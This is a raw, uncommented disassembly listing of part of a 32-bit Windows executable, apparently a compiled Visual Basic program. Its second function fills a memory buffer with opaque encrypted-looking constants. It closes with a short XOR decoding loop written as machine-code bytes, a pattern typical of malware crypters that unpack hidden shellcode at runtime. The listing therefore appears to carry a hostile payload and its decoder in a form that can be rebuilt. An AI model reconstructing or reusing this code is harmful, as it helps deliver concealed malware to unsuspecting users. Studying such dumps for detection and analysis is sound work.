  405387:	88 04 0b             	mov    %al,(%ebx,%ecx,1)
  40538a:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  405390:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  405396:	50                   	push   %eax
  405397:	51                   	push   %ecx
  405398:	8d 85 38 fe ff ff    	lea    -0x1c8(%ebp),%eax
  40539e:	52                   	push   %edx
  40539f:	8d 8d 3c fe ff ff    	lea    -0x1c4(%ebp),%ecx
  4053a5:	50                   	push   %eax
  4053a6:	8d 95 40 fe ff ff    	lea    -0x1c0(%ebp),%edx
  4053ac:	51                   	push   %ecx
  4053ad:	52                   	push   %edx
  4053ae:	6a 07                	push   $0x7
  4053b0:	ff 15 38 11 40 00    	call   *0x401138
  4053b6:	83 c4 20             	add    $0x20,%esp
  4053b9:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4053bf:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  4053c5:	c7 85 10 fe ff ff e8 	movl   $0x403ce8,-0x1f0(%ebp)
  4053cc:	3c 40 00 
  4053cf:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4053d5:	ff d6                	call   *%esi
  4053d7:	c7 85 10 fe ff ff dc 	movl   $0x403cdc,-0x1f0(%ebp)
  4053de:	3c 40 00 
  4053e1:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4053e7:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4053ed:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  4053f3:	ff d6                	call   *%esi
  4053f5:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4053fb:	8d 8d 9c fe ff ff    	lea    -0x164(%ebp),%ecx
  405401:	c7 85 10 fe ff ff 34 	movl   $0x403b34,-0x1f0(%ebp)
  405408:	3b 40 00 
  40540b:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405411:	ff d6                	call   *%esi
  405413:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405419:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40541c:	c7 85 10 fe ff ff 34 	movl   $0x404134,-0x1f0(%ebp)
  405423:	41 40 00 
  405426:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  40542c:	ff d6                	call   *%esi
  40542e:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405434:	8d 8d bc fe ff ff    	lea    -0x144(%ebp),%ecx
  40543a:	c7 85 10 fe ff ff fc 	movl   $0x403efc,-0x1f0(%ebp)
  405441:	3e 40 00 
  405444:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  40544a:	ff d6                	call   *%esi
  40544c:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  405452:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  405455:	8b 1d 84 11 40 00    	mov    0x401184,%ebx
  40545b:	03 c1                	add    %ecx,%eax
  40545d:	0f 80 9f 02 00 00    	jo     0x405702
  405463:	89 45 d8             	mov    %eax,-0x28(%ebp)
  405466:	e9 fd fc ff ff       	jmp    0x405168
  40546b:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405471:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  405477:	c7 85 10 fe ff ff 68 	movl   $0x404168,-0x1f0(%ebp)
  40547e:	41 40 00 
  405481:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405487:	ff d6                	call   *%esi
  405489:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40548f:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  405495:	c7 85 10 fe ff ff 74 	movl   $0x404174,-0x1f0(%ebp)
  40549c:	41 40 00 
  40549f:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4054a5:	ff d6                	call   *%esi
  4054a7:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4054ad:	8d 8d 54 fe ff ff    	lea    -0x1ac(%ebp),%ecx
  4054b3:	c7 85 10 fe ff ff 50 	movl   $0x404150,-0x1f0(%ebp)
  4054ba:	41 40 00 
  4054bd:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4054c3:	ff d6                	call   *%esi
  4054c5:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4054cb:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4054ce:	c7 85 10 fe ff ff 84 	movl   $0x404184,-0x1f0(%ebp)
  4054d5:	41 40 00 
  4054d8:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4054de:	ff d6                	call   *%esi
  4054e0:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4054e6:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4054e9:	c7 85 10 fe ff ff 90 	movl   $0x404190,-0x1f0(%ebp)
  4054f0:	41 40 00 
  4054f3:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4054f9:	ff d6                	call   *%esi
  4054fb:	6a 31                	push   $0x31
  4054fd:	ff 15 08 11 40 00    	call   *0x401108
  405503:	8b d0                	mov    %eax,%edx
  405505:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  40550b:	ff d3                	call   *%ebx
  40550d:	50                   	push   %eax
  40550e:	ff 15 34 11 40 00    	call   *0x401134
  405514:	8b 55 a0             	mov    -0x60(%ebp),%edx
  405517:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  40551d:	03 c2                	add    %edx,%eax
  40551f:	0f 80 dd 01 00 00    	jo     0x405702
  405525:	89 45 a0             	mov    %eax,-0x60(%ebp)
  405528:	ff 15 a0 11 40 00    	call   *0x4011a0
  40552e:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405534:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405537:	c7 85 10 fe ff ff 90 	movl   $0x404190,-0x1f0(%ebp)
  40553e:	41 40 00 
  405541:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405547:	ff d6                	call   *%esi
  405549:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40554f:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  405552:	c7 85 10 fe ff ff 84 	movl   $0x404184,-0x1f0(%ebp)
  405559:	41 40 00 
  40555c:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405562:	ff d6                	call   *%esi
  405564:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40556a:	8d 8d 54 fe ff ff    	lea    -0x1ac(%ebp),%ecx
  405570:	c7 85 10 fe ff ff 50 	movl   $0x404150,-0x1f0(%ebp)
  405577:	41 40 00 
  40557a:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405580:	ff d6                	call   *%esi
  405582:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405588:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  40558e:	c7 85 10 fe ff ff 74 	movl   $0x404174,-0x1f0(%ebp)
  405595:	41 40 00 
  405598:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  40559e:	ff d6                	call   *%esi
  4055a0:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4055a6:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  4055ac:	c7 85 10 fe ff ff 68 	movl   $0x404168,-0x1f0(%ebp)
  4055b3:	41 40 00 
  4055b6:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4055bc:	ff d6                	call   *%esi
  4055be:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4055c1:	b8 01 00 00 00       	mov    $0x1,%eax
  4055c6:	03 c1                	add    %ecx,%eax
  4055c8:	0f 80 34 01 00 00    	jo     0x405702
  4055ce:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4055d1:	e9 c9 f9 ff ff       	jmp    0x404f9f
  4055d6:	68 ef 56 40 00       	push   $0x4056ef
  4055db:	eb 49                	jmp    0x405626
  4055dd:	8d 8d 28 fe ff ff    	lea    -0x1d8(%ebp),%ecx
  4055e3:	8d 95 2c fe ff ff    	lea    -0x1d4(%ebp),%edx
  4055e9:	51                   	push   %ecx
  4055ea:	8d 85 30 fe ff ff    	lea    -0x1d0(%ebp),%eax
  4055f0:	52                   	push   %edx
  4055f1:	8d 8d 34 fe ff ff    	lea    -0x1cc(%ebp),%ecx
  4055f7:	50                   	push   %eax
  4055f8:	8d 95 38 fe ff ff    	lea    -0x1c8(%ebp),%edx
  4055fe:	51                   	push   %ecx
  4055ff:	8d 85 3c fe ff ff    	lea    -0x1c4(%ebp),%eax
  405605:	52                   	push   %edx
  405606:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  40560c:	50                   	push   %eax
  40560d:	51                   	push   %ecx
  40560e:	6a 07                	push   $0x7
  405610:	ff 15 38 11 40 00    	call   *0x401138
  405616:	83 c4 20             	add    $0x20,%esp
  405619:	8d 8d 18 fe ff ff    	lea    -0x1e8(%ebp),%ecx
  40561f:	ff 15 1c 10 40 00    	call   *0x40101c
  405625:	c3                   	ret
  405626:	8b 35 1c 10 40 00    	mov    0x40101c,%esi
  40562c:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40562f:	ff d6                	call   *%esi
  405631:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405634:	ff d6                	call   *%esi
  405636:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405639:	ff d6                	call   *%esi
  40563b:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  40563e:	ff d6                	call   *%esi
  405640:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  405643:	ff d6                	call   *%esi
  405645:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405648:	ff d6                	call   *%esi
  40564a:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  405650:	ff d6                	call   *%esi
  405652:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  405658:	ff d6                	call   *%esi
  40565a:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  405660:	ff d6                	call   *%esi
  405662:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  405668:	ff d6                	call   *%esi
  40566a:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  405670:	ff d6                	call   *%esi
  405672:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  405678:	ff d6                	call   *%esi
  40567a:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  405680:	ff d6                	call   *%esi
  405682:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  405688:	ff d6                	call   *%esi
  40568a:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  405690:	ff d6                	call   *%esi
  405692:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  405698:	ff d6                	call   *%esi
  40569a:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  4056a0:	ff d6                	call   *%esi
  4056a2:	8d 8d bc fe ff ff    	lea    -0x144(%ebp),%ecx
  4056a8:	ff d6                	call   *%esi
  4056aa:	8d 8d ac fe ff ff    	lea    -0x154(%ebp),%ecx
  4056b0:	ff d6                	call   *%esi
  4056b2:	8d 8d 9c fe ff ff    	lea    -0x164(%ebp),%ecx
  4056b8:	ff d6                	call   *%esi
  4056ba:	8d 8d 8c fe ff ff    	lea    -0x174(%ebp),%ecx
  4056c0:	ff d6                	call   *%esi
  4056c2:	8d 8d 7c fe ff ff    	lea    -0x184(%ebp),%ecx
  4056c8:	ff d6                	call   *%esi
  4056ca:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  4056d0:	ff d6                	call   *%esi
  4056d2:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  4056d8:	ff 15 a0 11 40 00    	call   *0x4011a0
  4056de:	8d 8d 54 fe ff ff    	lea    -0x1ac(%ebp),%ecx
  4056e4:	ff d6                	call   *%esi
  4056e6:	8d 8d 44 fe ff ff    	lea    -0x1bc(%ebp),%ecx
  4056ec:	ff d6                	call   *%esi
  4056ee:	c3                   	ret
  4056ef:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4056f2:	5f                   	pop    %edi
  4056f3:	5e                   	pop    %esi
  4056f4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4056fb:	5b                   	pop    %ebx
  4056fc:	8b e5                	mov    %ebp,%esp
  4056fe:	5d                   	pop    %ebp
  4056ff:	c2 08 00             	ret    $0x8
  405702:	ff 15 10 11 40 00    	call   *0x401110
  405708:	90                   	nop
  405709:	90                   	nop
  40570a:	90                   	nop
  40570b:	90                   	nop
  40570c:	90                   	nop
  40570d:	90                   	nop
  40570e:	90                   	nop
  40570f:	90                   	nop
  405710:	55                   	push   %ebp
  405711:	8b ec                	mov    %esp,%ebp
  405713:	83 ec 0c             	sub    $0xc,%esp
  405716:	68 66 12 40 00       	push   $0x401266
  40571b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405721:	50                   	push   %eax
  405722:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405729:	83 ec 5c             	sub    $0x5c,%esp
  40572c:	53                   	push   %ebx
  40572d:	56                   	push   %esi
  40572e:	57                   	push   %edi
  40572f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  405732:	c7 45 f8 48 12 40 00 	movl   $0x401248,-0x8(%ebp)
  405739:	6a 06                	push   $0x6
  40573b:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40573e:	33 f6                	xor    %esi,%esi
  405740:	68 20 42 40 00       	push   $0x404220
  405745:	50                   	push   %eax
  405746:	89 75 dc             	mov    %esi,-0x24(%ebp)
  405749:	89 75 bc             	mov    %esi,-0x44(%ebp)
  40574c:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40574f:	89 75 a8             	mov    %esi,-0x58(%ebp)
  405752:	ff 15 98 10 40 00    	call   *0x401098
  405758:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40575b:	c7 81 50 01 00 00 e8 	movl   $0x2da411e8,0x150(%ecx)
  405762:	11 a4 2d 
  405765:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405768:	c7 82 54 01 00 00 a1 	movl   $0xc6e2fca1,0x154(%edx)
  40576f:	fc e2 c6 
  405772:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405775:	c7 80 58 01 00 00 63 	movl   $0x47f58f63,0x158(%eax)
  40577c:	8f f5 47 
  40577f:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405782:	c7 81 5c 01 00 00 a1 	movl   $0x6f4e11a1,0x15c(%ecx)
  405789:	11 4e 6f 
  40578c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40578f:	c7 82 60 01 00 00 a1 	movl   $0xe8fa11a1,0x160(%edx)
  405796:	11 fa e8 
  405799:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40579c:	c7 80 64 01 00 00 78 	movl   $0x9df41178,0x164(%eax)
  4057a3:	11 f4 9d 
  4057a6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4057a9:	c7 01 55 89 e5 e8    	movl   $0xe8e58955,(%ecx)
  4057af:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4057b2:	c7 42 04 a4 03 00 00 	movl   $0x3a4,0x4(%edx)
  4057b9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4057bc:	c7 80 68 01 00 00 5e 	movl   $0xcce5055e,0x168(%eax)
  4057c3:	05 e5 cc 
  4057c6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4057c9:	c7 81 6c 01 00 00 fb 	movl   $0x1af663fb,0x16c(%ecx)
  4057d0:	63 f6 1a 
  4057d3:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4057d6:	c7 82 70 01 00 00 a9 	movl   $0x1d7e24a9,0x170(%edx)
  4057dd:	24 7e 1d 
  4057e0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4057e3:	c7 80 74 01 00 00 ad 	movl   $0x43aa74ad,0x174(%eax)
  4057ea:	74 aa 43 
  4057ed:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4057f0:	c7 81 78 01 00 00 f2 	movl   $0x4fa2fcf2,0x178(%ecx)
  4057f7:	fc a2 4f 
  4057fa:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4057fd:	c7 82 7c 01 00 00 5e 	movl   $0x100a455e,0x17c(%edx)
  405804:	45 0a 10 
  405807:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40580a:	c7 80 c0 02 00 00 f1 	movl   $0x249a05f1,0x2c0(%eax)
  405811:	05 9a 24 
  405814:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405817:	b8 5e 88 bb 33       	mov    $0x33bb885e,%eax
  40581c:	c7 81 c4 02 00 00 c4 	movl   $0x108604c4,0x2c4(%ecx)
  405823:	04 86 10 
  405826:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405829:	c7 82 c8 02 00 00 a1 	movl   $0xb9e79fa1,0x2c8(%edx)
  405830:	9f e7 b9 
  405833:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405836:	89 81 cc 02 00 00    	mov    %eax,0x2cc(%ecx)
  40583c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40583f:	c7 82 d0 02 00 00 f4 	movl   $0x269819f4,0x2d0(%edx)
  405846:	19 98 26 
  405849:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40584c:	c7 81 d4 02 00 00 d1 	movl   $0x229c21d1,0x2d4(%ecx)
  405853:	21 9c 22 
  405856:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405859:	c7 82 d8 02 00 00 d6 	movl   $0x149338d6,0x2d8(%edx)
  405860:	38 93 14 
  405863:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405866:	c7 81 dc 02 00 00 c4 	movl   $0x2e8114c4,0x2dc(%ecx)
  40586d:	14 81 2e 
  405870:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405873:	c7 82 e0 02 00 00 ce 	movl   $0xaff519ce,0x2e0(%edx)
  40587a:	19 f5 af 
  40587d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405880:	c7 81 e4 02 00 00 84 	movl   $0xb80a8a84,0x2e4(%ecx)
  405887:	8a 0a b8 
  40588a:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40588d:	c7 82 e8 02 00 00 cf 	movl   $0x2b9103cf,0x2e8(%edx)
  405894:	03 91 2b 
  405897:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40589a:	c7 81 ec 02 00 00 cd 	movl   $0x651d77cd,0x2ec(%ecx)
  4058a1:	77 1d 65 
  4058a4:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4058a7:	c7 82 f0 02 00 00 5c 	movl   $0x90a885c,0x2f0(%edx)
  4058ae:	88 0a 09 
  4058b1:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4058b4:	c7 81 f4 02 00 00 d5 	movl   $0x2b9936d5,0x2f4(%ecx)
  4058bb:	36 99 2b 
  4058be:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4058c1:	c7 82 f8 02 00 00 ce 	movl   $0x339414ce,0x2f8(%edx)
  4058c8:	14 94 33 
  4058cb:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4058ce:	c7 81 fc 02 00 00 c4 	movl   $0x359c21c4,0x2fc(%ecx)
  4058d5:	21 9c 35 
  4058d8:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4058db:	c7 82 00 03 00 00 d5 	movl   $0x2b9402d5,0x300(%edx)
  4058e2:	02 94 2b 
  4058e5:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4058e8:	c7 81 04 03 00 00 ec 	movl   $0x289812ec,0x304(%ecx)
  4058ef:	12 98 28 
  4058f2:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4058f5:	c7 82 08 03 00 00 d3 	movl   $0xaff50ed3,0x308(%edx)
  4058fc:	0e f5 af 
  4058ff:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405902:	bf ce 19 81 22       	mov    $0x228119ce,%edi
  405907:	c7 81 0c 03 00 00 b2 	movl   $0xb80a89b2,0x30c(%ecx)
  40590e:	89 0a b8 
  405911:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405914:	c7 82 10 03 00 00 ef 	movl   $0x35a203ef,0x310(%edx)
  40591b:	03 a2 35 
  40591e:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405921:	c7 81 14 03 00 00 c8 	movl   $0x119003c8,0x314(%ecx)
  405928:	03 90 11 
  40592b:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40592e:	c7 82 18 03 00 00 c8 	movl   $0x328105c8,0x318(%edx)
  405935:	05 81 32 
  405938:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40593b:	c7 81 1c 03 00 00 c0 	movl   $0x22b81bc0,0x31c(%ecx)
  405942:	1b b8 22 
  405945:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405948:	c7 82 20 03 00 00 cc 	movl   $0x3e8718cc,0x320(%edx)
  40594f:	18 87 3e 
  405952:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405955:	c7 81 24 03 00 00 a1 	movl   $0xb98e9fa1,0x324(%ecx)
  40595c:	9f 8e b9 
  40595f:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405962:	89 82 28 03 00 00    	mov    %eax,0x328(%edx)
  405968:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40596b:	c7 81 2c 03 00 00 e6 	movl   $0x48112e6,0x32c(%ecx)
  405972:	12 81 04 
  405975:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405978:	89 ba 30 03 00 00    	mov    %edi,0x330(%edx)
  40597e:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405981:	ba d9 03 a1 2f       	mov    $0x2fa103d9,%edx
  405986:	89 91 34 03 00 00    	mov    %edx,0x334(%ecx)
  40598c:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40598f:	b9 d3 12 94 23       	mov    $0x239412d3,%ecx
  405994:	89 8b 38 03 00 00    	mov    %ecx,0x338(%ebx)
  40599a:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40599d:	c7 83 3c 03 00 00 a1 	movl   $0xb94b9fa1,0x33c(%ebx)
  4059a4:	9f 4b b9 
  4059a7:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4059aa:	89 83 40 03 00 00    	mov    %eax,0x340(%ebx)
  4059b0:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4059b3:	c7 83 44 03 00 00 f2 	movl   $0x48112f2,0x344(%ebx)
  4059ba:	12 81 04 
  4059bd:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4059c0:	c7 43 50 ef 43 7c 08 	movl   $0x87c43ef,0x50(%ebx)
  4059c7:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4059ca:	c7 43 54 a5 fe 0c c4 	movl   $0xc40cfea5,0x54(%ebx)
  4059d1:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  4059d4:	89 bb 48 03 00 00    	mov    %edi,0x348(%ebx)
  4059da:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4059dd:	89 97 4c 03 00 00    	mov    %edx,0x34c(%edi)
  4059e3:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4059e6:	89 8a 50 03 00 00    	mov    %ecx,0x350(%edx)
  4059ec:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4059ef:	c7 82 54 03 00 00 a1 	movl   $0xb9319fa1,0x354(%edx)
  4059f6:	9f 31 b9 
  4059f9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4059fc:	89 82 58 03 00 00    	mov    %eax,0x358(%edx)
  405a02:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405a05:	c7 80 5c 03 00 00 f3 	movl   $0x328612f3,0x35c(%eax)
  405a0c:	12 86 32 
  405a0f:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a12:	c7 82 60 03 00 00 cc 	movl   $0x2fa112cc,0x360(%edx)
  405a19:	12 a1 2f 
  405a1c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405a1f:	89 88 64 03 00 00    	mov    %ecx,0x364(%eax)
  405a25:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405a28:	c7 81 68 03 00 00 a1 	movl   $0xb90f9fa1,0x368(%ecx)
  405a2f:	9f 0f b9 
  405a32:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a35:	c7 82 6c 03 00 00 5e 	movl   $0x22a1885e,0x36c(%edx)
  405a3c:	88 a1 22 
  405a3f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405a42:	c7 80 70 03 00 00 d3 	movl   $0x299c1ad3,0x370(%eax)
  405a49:	1a 9c 29 
  405a4c:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405a4f:	b8 d2 04 f5 af       	mov    $0xaff504d2,%eax
  405a54:	c7 81 74 03 00 00 c0 	movl   $0x179003c0,0x374(%ecx)
  405a5b:	03 90 17 
  405a5e:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a61:	b9 d3 18 96 22       	mov    $0x229618d3,%ecx
  405a66:	89 8a 78 03 00 00    	mov    %ecx,0x378(%edx)
  405a6c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a6f:	89 82 7c 03 00 00    	mov    %eax,0x37c(%edx)
  405a75:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a78:	c7 82 80 03 00 00 16 	movl   $0xb80a8916,0x380(%edx)
  405a7f:	89 0a b8 
  405a82:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a85:	c7 82 84 03 00 00 e6 	movl   $0x28112e6,0x384(%edx)
  405a8c:	12 81 02 
  405a8f:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a92:	c7 82 98 00 00 00 2a 	movl   $0x47c56a2a,0x98(%edx)
  405a99:	6a c5 47 
  405a9c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405a9f:	c7 82 9c 00 00 00 a1 	movl   $0x1c7e77a1,0x9c(%edx)
  405aa6:	77 7e 1c 
  405aa9:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405aac:	c7 82 88 03 00 00 d9 	movl   $0x4811ed9,0x388(%edx)
  405ab3:	1e 81 04 
  405ab6:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ab9:	c7 82 8c 03 00 00 ce 	movl   $0x179013ce,0x38c(%edx)
  405ac0:	13 90 17 
  405ac3:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ac6:	89 8a 90 03 00 00    	mov    %ecx,0x390(%edx)
  405acc:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405acf:	89 81 94 03 00 00    	mov    %eax,0x394(%ecx)
  405ad5:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405ad8:	c7 82 98 03 00 00 4b 	movl   $0xb80a8b4b,0x398(%edx)
  405adf:	8b 0a b8 
  405ae2:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405ae5:	c7 80 9c 03 00 00 e6 	movl   $0x48112e6,0x39c(%eax)
  405aec:	12 81 04 
  405aef:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405af2:	c7 81 a0 03 00 00 ce 	movl   $0x26981ace,0x3a0(%ecx)
  405af9:	1a 98 26 
  405afc:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405aff:	c7 82 a4 03 00 00 cf 	movl   $0x2eb913cf,0x3a4(%edx)
  405b06:	13 b9 2e 
  405b09:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405b0c:	c7 80 a8 03 00 00 cf 	movl   $0x47a212cf,0x3a8(%eax)
  405b13:	12 a2 47 
  405b16:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405b19:	c7 81 ac 03 00 00 90 	movl   $0x90909090,0x3ac(%ecx)
  405b20:	90 90 90 
  405b23:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405b26:	c7 82 b0 03 00 00 be 	movl   $0xf577a1be,0x3b0(%edx)
  405b2d:	a1 77 f5 
  405b30:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405b33:	c7 80 b4 03 00 00 47 	movl   $0x243c8b47,0x3b4(%eax)
  405b3a:	8b 3c 24 
  405b3d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405b40:	c7 81 b8 03 00 00 b8 	movl   $0x3a4b8,0x3b8(%ecx)
  405b47:	a4 03 00 
  405b4a:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405b4d:	c7 82 bc 03 00 00 00 	movl   $0x4e88300,0x3bc(%edx)
  405b54:	83 e8 04 
  405b57:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405b5a:	c7 80 c0 03 00 00 31 	movl   $0xc7833731,0x3c0(%eax)
  405b61:	37 83 c7 
  405b64:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405b67:	c7 81 c4 03 00 00 04 	movl   $0x75c08504,0x3c4(%ecx)
  405b6e:	85 c0 75 
  405b71:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405b74:	c7 82 c8 03 00 00 f4 	movl   $0xc3f4,0x3c8(%edx)
  405b7b:	c3 00 00 
  405b7e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405b81:	89 b0 cc 03 00 00    	mov    %esi,0x3cc(%eax)
